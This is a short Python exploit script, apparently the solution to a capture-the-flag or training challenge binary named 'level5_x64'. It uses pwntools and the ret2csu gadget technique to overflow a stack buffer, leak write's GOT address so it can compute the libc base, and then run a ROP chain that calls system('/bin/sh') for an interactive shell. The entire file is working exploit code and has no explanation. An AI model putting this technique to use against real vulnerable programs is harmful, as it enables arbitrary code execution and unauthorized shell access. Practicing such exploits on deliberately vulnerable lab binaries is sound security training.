from pwn import *

sh = process("./level5_x64")
pwn = ELF("./level5_x64")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def csu(rbx, rbp, r12, r13, r14, r15, last):
	# pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    payload = 'a' * 0x88 + p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(csu_front_addr)
    payload += 'a' * 0x38 + p64(last)
    sh.sendline(payload)
    sleep(1)

write_got = pwn.got["write"]
main = pwn.symbols["main"]
csu_front_addr = 0x400690
csu_end_addr = 0x4006AA
pop_rdi_ret = 0x4006b3

sh.recv()
csu(0, 1, write_got, 8, write_got, 1, main)
write_addr = u64(sh.recvuntil("Input:\n", drop=True).ljust(8, '\x00'))
log.info("write address: %x" % write_addr)
libc_base = write_addr - libc.symbols["write"]
system = libc_base + libc.symbols["system"]
binsh = libc_base + next(libc.search("/bin/sh"))
sh.sendline('a'*0x88 + p64(pop_rdi_ret) + p64(binsh) + p64(system))
sh.interactive()
